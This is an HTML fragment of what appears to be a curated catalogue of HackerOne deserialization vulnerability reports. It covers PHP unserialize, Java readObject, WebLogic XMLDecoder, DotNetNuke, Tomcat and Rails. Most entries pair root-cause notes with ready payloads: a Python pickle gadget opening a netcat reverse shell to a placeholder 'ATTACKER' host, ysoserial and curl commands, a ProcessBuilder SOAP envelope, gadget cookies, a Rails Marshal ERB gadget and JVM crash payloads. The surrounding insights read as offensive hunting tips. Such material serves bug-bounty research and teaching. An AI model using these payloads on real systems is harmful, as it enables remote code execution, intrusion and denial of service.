+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/415222" target="_blank" rel="noopener">hackerone.com/reports/415222</a></span><a class="src" href="#report-415222" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-415682" style="--sv:var(--sev-crit)" data-sev="4" data-votes="17" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>LFI -&gt; PHP object injection + XXE -&gt; SSRF -&gt; Python pickle RCE chain</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#415682</b> · h1-5411-ctf · none · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-5411-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>LFI (source disclosure) -&gt; PHP object injection -&gt; XXE</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A chain: an LFI in the template param leaks source; unserialize() of user input on a hidden endpoint enables PHP object injection whose __toString triggers XXE (SSRF/file read); the SSRF reaches an internal service that unpickles a user-controlled status param, giving Python RCE.</p>
+<h4>Method</h4><ol><li>Use template param LFI to read app source and /etc/passwd</li><li>Craft a serialized ConfigFile object whose config_raw holds an XXE doc; upload via import endpoint to get XXE/SSRF</li><li>Enumerate internal services via /proc/&lt;pid&gt;/cmdline over SSRF; find internal service on port 1337</li><li>Send a malicious base64 cPickle (os.system reverse shell) as the status param to the internal service</li></ol>
+<div class="pre"># LFI:
+POST /api/generate.php  template=../../../../../../etc/passwd&amp;type=text
+# PHP object injection payload (b64-decoded):
+a:2:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:...:"&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue'&gt;]&gt;&lt;memes&gt;&lt;toptext&gt;&amp;xxe;&lt;/toptext&gt;...";}i:1;O:11:"Maintenance":0:{}}
+# Python pickle RCE:
+class PickleRce(object):
+    def __reduce__(self):
+        return (os.system,("nc ATTACKER 9300 -e /bin/bash",))
+# base64(cPickle.dumps(PickleRce())) -&gt; send as status param</div>
+<p class="insight"><b>Insight —</b> Recon internal services blindly via SSRF by walking /proc/&lt;pid&gt;/cmdline to reveal listening daemons and SSH tunnels. unserialize()/pickle.loads on any user input is RCE; __toString on injected PHP objects is a reliable trigger for XXE/SSRF.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/415682" target="_blank" rel="noopener">hackerone.com/reports/415682</a></span><a class="src" href="#report-415682" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-542670" style="--sv:var(--sev-crit)" data-sev="4" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP unserialize() on XML-RPC parameter (Revive Adserver)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#542670</b> · revive_adserver · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>revive_adserver</b></span><span>Surface <b>web</b></span><span>Chain <b>XML-RPC param -&gt; unserialize() -&gt; PHP object injection</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The XML-RPC endpoint www/delivery/dxmlrpc.php calls unserialize() on the first parameter of the 'pluginExecute' RPC method, so an attacker-supplied serialized object reaches unserialize() =&gt; PHP object injection.</p>
+<h4>Method</h4><ol><li>Send an XML-RPC request invoking pluginExecute with a crafted serialized string as the first parameter.</li><li>unserialize() instantiates attacker-controlled objects; chain a POP gadget for impact.</li></ol>
+<div class="pre">&lt;methodCall&gt;&lt;methodName&gt;pluginExecute&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;O:8:"EvilObj":0:{}&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;</div>
+<p class="insight"><b>Insight —</b> RPC/XML-RPC method parameters are an overlooked unserialize() sink; audit dispatcher methods (pluginExecute-style) that pass raw params into unserialize(). Any reachable unserialize() on user input is PHP object injection.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/542670" target="_blank" rel="noopener">hackerone.com/reports/542670</a></span><a class="src" href="#report-542670" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-329376" style="--sv:var(--sev-crit)" data-sev="4" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Java Object Deserialization RCE in PeopleSoft /monitor (CVE-2017-10366)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#329376</b> · deptofdefense · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>readObject() on POST body -&gt; ysoserial gadget -&gt; RCE (</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Oracle PeopleSoft's 'monitor' servlet (path /psc/&lt;site&gt;/.../monitor) deserializes POST bodies via readObject() with no type validation; a ysoserial object executes on deserialization -&gt; RCE (or a malformed object -&gt; OOM DoS).</p>
+<h4>Method</h4><ol><li>Generate a blind-detection payload: ysoserial URLDNS http://CANARY.attacker &gt; payload.</li><li>POST it raw to the monitor endpoint: curl https://TARGET/monitor/&lt;site&gt; --data-binary @payload.</li><li>A DNS query from the target to your BIND server confirms deserialization; swap URLDNS for CommonsCollections for RCE.</li><li>DoS variant: post the known OOM byte payload to crash the JVM (java.lang.OutOfMemoryError).</li></ol>
+<div class="pre">java -jar ysoserial.jar URLDNS http://canary.attacker.tld &gt; payload
+curl https://TARGET/monitor/EXPROD_1 --data-binary @payload -k
+# DoS:
+echo -n 'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3...' | base64 -d &gt; payload_dos
+curl https://TARGET/monitor/EXPROD_1 --data-binary @payload_dos -k</div>
+<p class="insight"><b>Insight —</b> ysoserial URLDNS is the safe, universal blind test for Java deserialization -- it triggers only a DNS lookup, needs no gadget lib, and proves the sink before you weaponize. Exposed PeopleSoft /monitor endpoints are a classic readObject() sink; blocking the path is the fix (patching gadget libs is insufficient).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/329376" target="_blank" rel="noopener">hackerone.com/reports/329376</a></span><a class="src" href="#report-329376" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-73245" style="--sv:var(--sev-crit)" data-sev="4" data-votes="5" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP object injection → SoapClient::__getCookies type confusion → RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#73245</b> · ibb · awarded · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>unserialize() PHP object injection -&gt; internal type confu</b></span></div>
+<h4>Root cause</h4><p style="margin:0">SoapClient::__getCookies() passed the _cookies property to Z_ARRVAL_P/zend_hash_copy without verifying it is a real array. Via unserialize() an attacker sets _cookies to a crafted string that the engine treats as a HashTable, so a fake HashTable/Bucket/ZVAL layout yields arbitrary memory disclosure or code execution.</p>
+<h4>Method</h4><ol><li>Reach any unserialize() sink fed with attacker data</li><li>Inject a SoapClient object whose _cookies is a string holding a fake HashTable/Bucket/ZVAL</li><li>Call (or let the app call) __getCookies() to trigger the type-confused hash copy</li><li>Point the fake ZVAL/function pointer at zend_eval_string to run arbitrary PHP/shell</li></ol>
+<div class="pre">O:10:"SoapClient":1:{s:8:"_cookies";s:&lt;LEN&gt;:"&lt;FAKE_HASHTABLE_BYTES&gt;";}
+// $z = unserialize($exploit); $z-&gt;__getCookies();
+// fake ZVAL type byte 0x04 (IS_ARRAY) + crafted Bucket -&gt; zend_hash_copy over attacker memory -&gt; call func_addr (zend_eval_string)</div>
+<p class="insight"><b>Insight —</b> unserialize() on attacker input is dangerous even without app-level POP gadgets: built-in classes (SoapClient here) can be weaponized directly through engine type confusion. Treat any unserialize sink as potential RCE and enumerate internal classes whose magic/accessor methods touch typed internals.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/73245" target="_blank" rel="noopener">hackerone.com/reports/73245</a></span><a class="src" href="#report-73245" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-634630" style="--sv:var(--sev-crit)" data-sev="4" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Oracle WebLogic wls-wsat XMLDecoder RCE (CVE-2017-10352)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#634630</b> · deptofdefense · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WebLogic's wls-wsat SOAP endpoint deserializes the WorkContext header with java.beans.XMLDecoder, which instantiates arbitrary Java objects. A ProcessBuilder object in the XML yields OS command execution.</p>
+<h4>Method</h4><ol><li>Locate /wls-wsat/CoordinatorPortType (or other wls-wsat SOAP paths).</li><li>Send a SOAP envelope whose work:WorkContext header contains a java.beans.XMLDecoder block.</li><li>Prove exec with a Thread.sleep (timing) then ProcessBuilder running nslookup to a collaborator for OOB confirmation.</li></ol>
+<div class="pre">POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Content-Type: text/xml
+
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+ &lt;soapenv:Header&gt;
+  &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
+   &lt;java version="1.8.0_151" class="java.beans.XMLDecoder"&gt;
+    &lt;void class="java.lang.ProcessBuilder"&gt;
+     &lt;array class="java.lang.String" length="3"&gt;
+      &lt;void index="0"&gt;&lt;string&gt;cmd&lt;/string&gt;&lt;/void&gt;
+      &lt;void index="1"&gt;&lt;string&gt;/c&lt;/string&gt;&lt;/void&gt;
+      &lt;void index="2"&gt;&lt;string&gt;nslookup COLLAB.burpcollaborator.net&lt;/string&gt;&lt;/void&gt;
+     &lt;/array&gt;
+     &lt;void method="start"/&gt;
+    &lt;/void&gt;
+   &lt;/java&gt;
+  &lt;/work:WorkContext&gt;
+ &lt;/soapenv:Header&gt;
+ &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;</div>
+<p class="insight"><b>Insight —</b> Fingerprint outdated WebLogic and hit wls-wsat; XMLDecoder deserialization = deterministic RCE. Use Thread.sleep for a blind timing oracle and ProcessBuilder+nslookup for OOB proof without needing outbound HTTP.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/634630" target="_blank" rel="noopener">hackerone.com/reports/634630</a></span><a class="src" href="#report-634630" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-329400" style="--sv:var(--sev-crit)" data-sev="4" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Java deserialization RCE/DoS in Oracle PeopleSoft /monitor (URLDNS blind detection)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#329400</b> · deptofdefense · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Oracle PeopleSoft PSFT 'monitor' service deserializes attacker-supplied Java objects via readObject() with no type validation (CVE-2017-10366), so any client can post a serialized gadget chain and have it instantiated server-side.</p>
+<h4>Method</h4><ol><li>Locate the PeopleSoft monitor endpoint (path /monitor/ on the PSC/PIA host).</li><li>Generate a ysoserial URLDNS payload pointing at an attacker-controlled DNS name to blind-confirm deserialization without needing a gadget library on the classpath.</li><li>POST the raw serialized bytes with Content-Type binary and watch the authoritative BIND log for the lookup to prove code execution.</li><li>For full RCE swap URLDNS for a CommonsCollections/other RCE gadget; a tiny hand-crafted array payload triggers OutOfMemoryError DoS.</li></ol>
+<div class="pre"># blind-detect deserialization (no gadget needed):
+java -jar ysoserial-all.jar URLDNS http://dod_test.jexboss.info &gt; payload
+curl https://TARGET/monitor/ --data-binary @payload -k
+# BIND log tell: client X#... query: dod_test.jexboss.info IN A
+
+# DoS payload (nested Object array, base64):
+echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3..." | base64 -d &gt; payload_dos
+curl https://TARGET/monitor/ --data-binary @payload_dos -k  # -&gt; java.lang.OutOfMemoryError: Java heap space</div>
+<p class="insight"><b>Insight —</b> Use ysoserial URLDNS as a universal, dependency-free canary to confirm any Java deserialization sink before hunting a working RCE gadget; a DNS callback proves readObject() ran. On PeopleSoft the sink is the /monitor/ service (not /psc/), and patching gadget libraries is NOT a fix -- block the endpoint.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/329400" target="_blank" rel="noopener">hackerone.com/reports/329400</a></span><a class="src" href="#report-329400" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-512076" style="--sv:var(--sev-crit)" data-sev="4" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP object injection via unserialize() on XML-RPC 'what' parameter (Revive Adserver openads.spc)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#512076</b> · revive_adserver · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>revive_adserver</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The adxmlrpc.php XML-RPC handler passes the attacker-controlled 'what' parameter of the openads.spc RPC method straight into unserialize(), enabling PHP Object Injection / POP-chain exploitation.</p>
+<h4>Method</h4><ol><li>Send an XML-RPC request to www/delivery/adxmlrpc.php invoking the openads.spc method.</li><li>Place a crafted serialized PHP object string in the 'what' parameter so it reaches the unserialize() call.</li><li>Trigger a POP gadget chain (via __wakeup/__destruct magic methods of loaded classes) for object injection, and abuse serialize-related PHP CVEs.</li></ol>
+<div class="pre">POST /www/delivery/adxmlrpc.php HTTP/1.1
+Content-Type: text/xml
+
+&lt;?xml version="1.0"?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;openads.spc&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;O:8:"SomeClass":1:{s:3:"cmd";s:2:"id";}&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;
+&lt;!-- crafted PHP serialized object lands in unserialize() via the 'what' parameter --&gt;</div>
+<p class="insight"><b>Insight —</b> XML-RPC / RPC dispatch parameters are a classic hiding spot for unserialize() sinks. When you see a PHP endpoint taking an opaque string arg, feed a serialized object (O:...) probe and look for magic-method side effects; escalate via a POP chain from any autoloaded class.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/512076" target="_blank" rel="noopener">hackerone.com/reports/512076</a></span><a class="src" href="#report-512076" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1379975" style="--sv:var(--sev-high)" data-sev="3" data-votes="296" data-bounty="20000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Privileged Java readObject on disc-controlled file -&gt; BD-J sandbox escape chain (PS4/PS5)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1379975</b> · playstation · 20000 · 296 votes · resolved</div>
+<div class="taxo"><span>Program <b>playstation</b></span><span>Surface <b>other</b></span><span>Chain <b>privileged deserialization -&gt; arbitrary class instantiati</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A privileged component deserialized an attacker-replaceable file (userprefs) with ObjectInputStream.readObject() inside AccessController.doPrivileged, instantiating classes in privileged context; combined with arbitrary class instantiation, an Ixc/RMI privileged method-invocation primitive, a compiler write-what-where, and a UDF memcpy overflow, this yields JIT/code execution.</p>
+<h4>Method</h4><ol><li>Replace the privileged-context serialized file (userprefs) with a malicious object graph to instantiate a ClassLoader subclass and call defineClass with AllPermission, disabling the SecurityManager.</li><li>Use com.oracle.security.Service.newInstance (Class.forName on arbitrary name) to instantiate restricted classes; bypass its registration check via setProviderAccessor.</li><li>Use IxcProxy.invokeMethod to call public non-static methods (e.g. File.list) in privileged context by subclassing and implementing a Remote interface that re-declares the method throws RemoteException.</li><li>Send an untrusted compiler_data pointer to the compiler receiver thread for a write-what-where into JIT memory; write shellcode. (Vuln 5 UDF overflow: make inf_len &gt; sector_size for a memcpy overflow.)</li></ol>
+<div class="pre">// Ixc privileged-invocation bypass pattern:
+interface FileInterface extends java.rmi.Remote { String[] list() throws java.rmi.RemoteException; }
+class FileImpl extends java.io.File implements FileInterface { FileImpl(String p){ super(p);} }
+// register FileImpl via Ixc, then invoke list() -&gt; runs in privileged context, bypassing File permission checks</div>
+<p class="insight"><b>Insight —</b> Any readObject on a file/stream an attacker can influence is RCE-adjacent, and doubly dangerous inside doPrivileged. On sandboxed JVMs, RMI/Ixc bridges and reflective factories (Class.forName, provider accessors) are classic paths to run code with elevated permissions and defeat the SecurityManager.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1379975" target="_blank" rel="noopener">hackerone.com/reports/1379975</a></span><a class="src" href="#report-1379975" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2438265" style="--sv:var(--sev-high)" data-sev="3" data-votes="87" data-bounty="4860">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>RDoc unsafe YAML load of .rdoc_options / doc cache -&gt; object injection RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2438265</b> · ibb · $4860 · 87 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>Untrusted repo -&gt; rdoc reads YAML config/cache -&gt; obje</b></span></div>
+<h4>Root cause</h4><p style="margin:0">RDoc parsed its .rdoc_options config and documentation cache as YAML without restricting permitted classes, so a crafted file deserializes arbitrary Ruby objects (object injection) and reaches RCE when `rdoc` runs on an untrusted repository.</p>
+<h4>Method</h4><ol><li>Place a malicious .rdoc_options (or documentation cache) in a repository containing a crafted YAML object-injection payload</li><li>Get the victim to run rdoc / doc generation over that repo (CI, gem install, local docs)</li><li>Unsafe YAML.load restores attacker-chosen classes -&gt; code execution</li></ol>
+<div class="pre"># RDoc 6.3.3-6.6.2 (Ruby 3.x-3.3.0) parses .rdoc_options as YAML with no permitted_classes.
+# A crafted .rdoc_options / doc cache with a Ruby object-injection gadget executes on `rdoc`.
+# Fix: upgrade rdoc &gt;= 6.6.3.1 (or 6.3.4.1/6.4.1.1/6.5.1.1). CVE-2024-27281 / GHSA-592j-995h-p23j</div>
+<p class="insight"><b>Insight —</b> Any tool that YAML.load()s a repo-controlled config or cache file is an object-injection vector. When auditing dev tooling (doc generators, linters, build config), look for YAML.load / Marshal.load of files that ship inside a cloned repo; running the tool on attacker repos becomes RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2438265" target="_blank" rel="noopener">hackerone.com/reports/2438265</a></span><a class="src" href="#report-2438265" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-403083" style="--sv:var(--sev-high)" data-sev="3" data-votes="84" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP Phar deserialization via CSV importer fopen()</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#403083</b> · automattic · awarded · 84 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Chain <b>Shop-manager (low priv) -&gt; phar deserialization -&gt; RCE</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WooCommerce WC_Product_CSV_Importer constructor calls read_file()-&gt;fopen($this-&gt;file) on an attacker-controlled path with no scheme/type check; supplying a phar:// URL triggers deserialization of the Phar metadata object (POP chain) =&gt; RCE.</p>
+<h4>Method</h4><ol><li>Upload a valid Phar polyglot (renamed poc.jpg) through the media uploader (extension is irrelevant to phar://).</li><li>Start the product CSV import and, at the confirmation step, tamper the POST 'file' parameter to phar://path/to/poc.jpg.</li><li>fopen() on the phar:// path deserializes the embedded gadget and executes PHP.</li></ol>
+<div class="pre"># tamper import POST param:
+file=phar:///var/www/html/wp-content/uploads/2018/xx/poc.jpg</div>
+<p class="insight"><b>Insight —</b> Any filesystem function (fopen/file_exists/is_dir/getimagesize/etc.) reached with a user-controlled path is a phar:// deserialization sink even without unserialize(); upload a phar polyglot first, then point a filesystem call at it.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/403083" target="_blank" rel="noopener">hackerone.com/reports/403083</a></span><a class="src" href="#report-403083" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-198734" style="--sv:var(--sev-high)" data-sev="3" data-votes="68" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP GMP unserialize type confusion -&gt; object property overwrite -&gt; RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#198734</b> · ibb · awarded · 68 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>Cookie unserialize -&gt; GMP type confusion -&gt; overwrite </b></span></div>
+<h4>Root cause</h4><p style="margin:0">PHP's GMP unserialize (5.6&lt;5.6.30) has a type-confusion: a crafted __wakeup can turn the GMP object into an integer ZVAL, so zend_hash_copy writes attacker-controlled properties into an arbitrary already-instantiated object in the object store; in MyBB&lt;=1.8.3 this overwrites the templates $cache used in eval() for RCE.</p>
+<h4>Method</h4><ol><li>Craft a serialized GMP payload that casts to an integer equal to an object handle</li><li>Chain DateInterval.__wakeup (convert_to_long) to trigger the cast</li><li>Point the handle at the target object (MyBB $templates, handle 5) and set its $cache['index'] to PHP code</li><li>Deliver via the mybb[forumread] cookie which is unserialize()d; eval() in template parsing runs the code</li></ol>
+<div class="pre">curl --cookie 'mybb[forumread]=a:1:{i:0;C:3:"GMP":106:{s:1:"5";a:2:{s:5:"cache";a:1:{s:5:"index";s:14:"{${phpinfo()}}";}i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}}}' http://target/mybb/</div>
+<p class="insight"><b>Insight —</b> Native-extension unserialize handlers (GMP, and historically others) can be type-confusion primitives independent of app POP chains. Where an app unserialize()s a cookie/input AND later eval()s templated data, overwrite the template cache object to inject PHP.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/198734" target="_blank" rel="noopener">hackerone.com/reports/198734</a></span><a class="src" href="#report-198734" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-876708" style="--sv:var(--sev-high)" data-sev="3" data-votes="56" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>DotNetNuke DNNPersonalization cookie deserialization RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#876708</b> · deptofdefense · none · 56 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">DNN &lt;9.3.0 deserializes the DNNPersonalization cookie on 404 pages using a type that permits an ExpandedWrapper/ObjectDataProvider gadget, yielding arbitrary method invocation (file read/write, RCE).</p>
+<h4>Method</h4><ol><li>Request any 404 page (e.g. /test) to trigger DNNPersonalization processing</li><li>Set DNNPersonalization cookie to an ExpandedWrapper+ObjectDataProvider gadget (ysoserial.net DotNetNuke plugin)</li><li>Use WriteFile/ProcessStartInfo method to write a webshell or read files</li></ol>
+<div class="pre">Cookie: DNNPersonalization=&lt;profile&gt;&lt;item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework]], System.Data.Services"&gt;&lt;ExpandedWrapperOfFileSystemUtilsObjectDataProvider ...&gt;&lt;ProjectedProperty0&gt;&lt;MethodName&gt;WriteFile&lt;/MethodName&gt;&lt;MethodParameters&gt;&lt;anyType xsi:type="xsd:string"&gt;test&lt;/anyType&gt;&lt;/MethodParameters&gt;&lt;ObjectInstance xsi:type="FileSystemUtils"&gt;&lt;/ObjectInstance&gt;&lt;/ProjectedProperty0&gt;&lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider&gt;&lt;/item&gt;&lt;/profile&gt;</div>
+<p class="insight"><b>Insight —</b> On any DotNetNuke target, fingerprint version and try a DNNPersonalization gadget cookie against a 404 page; generate with ysoserial.net's DotNetNuke plugin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/876708" target="_blank" rel="noopener">hackerone.com/reports/876708</a></span><a class="src" href="#report-876708" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-3031518" style="--sv:var(--sev-high)" data-sev="3" data-votes="56" data-bounty="4323">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Tomcat partial PUT temp-file smuggling into file-based session deserialization (CVE-2025-24813)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#3031518</b> · ibb · $4323 · 56 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>partial PUT write -&gt; planted session file -&gt; Java dese</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Tomcat's partial PUT writes a temp file named from the user path with '/' replaced by '.'; with the default servlet write-enabled and file-based session persistence at the default location, an attacker uploads a serialized-session file whose deserialization on session load yields RCE (needs a gadget lib on classpath).</p>
+<h4>Method</h4><ol><li>Confirm default servlet writes enabled and partial PUT supported (enabled by default).</li><li>PUT a partial content body containing a malicious serialized session object; the path.separator-&gt;'.' rewrite lands it as Tomcat's session store file.</li><li>Trigger session load with the matching JSESSIONID so Tomcat deserializes the attacker file.</li></ol>
+<div class="pre">PUT /path/to/session HTTP/1.1
+Content-Range: bytes 0-.../...
+Content-Length: N
+
+&lt;ysoserial serialized session object bytes&gt;</div>
+<p class="insight"><b>Insight —</b> Chained-precondition bugs: partial PUT (write primitive) + file-based session persistence (deserialization sink) + any gadget lib. When auditing servers, enumerate write-enabled default servlets and session persistence config together, not in isolation.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3031518" target="_blank" rel="noopener">hackerone.com/reports/3031518</a></span><a class="src" href="#report-3031518" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-473888" style="--sv:var(--sev-high)" data-sev="3" data-votes="41" data-bounty="1500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Rails MessageVerifier Marshal deserialization RCE via ActiveStorage signed id (CVE-2019-5420)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#473888</b> · rails · 1500 · 41 votes · resolved</div>
+<div class="taxo"><span>Program <b>rails</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">MessageVerifier/MessageEncryptor default to Marshal as serializer; ActiveStorage signs blob keys with a verifier. In dev mode secret_key_base = MD5(app name) is derivable, so an attacker forges a valid signed blob_key wrapping a Marshal gadget (ERB via DeprecatedInstanceVariableProxy) -&gt; RCE on the disk_service route.</p>
+<h4>Method</h4><ol><li>Recover/guess secret_key_base (dev: MD5 of app class name)</li><li>Derive the ActiveStorage verifier key and build a Marshal ERB gadget</li><li>Sign it as blob_key and GET /rails/active_storage/disk/&lt;signed&gt;/x to deserialize -&gt; RCE</li></ol>
+<div class="pre">erb = ERB.allocate; erb.instance_variable_set(:@src,'`touch /tmp/rce`'); erb.instance_variable_set(:@filename,'1'); erb.instance_variable_set(:@lineno,1)
+dump = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result)
+verifier.generate(dump, purpose: :blob_key)  # -&gt; use as :encoded_key in /rails/active_storage/disk/&lt;...&gt;/x</div>
+<p class="insight"><b>Insight —</b> Any Rails app leaking or using a weak secret_key_base exposes every MessageVerifier/Encryptor (cookies, ActiveStorage signed ids) to Marshal object-injection RCE; dev mode auto-derives the key from the app name.</p>
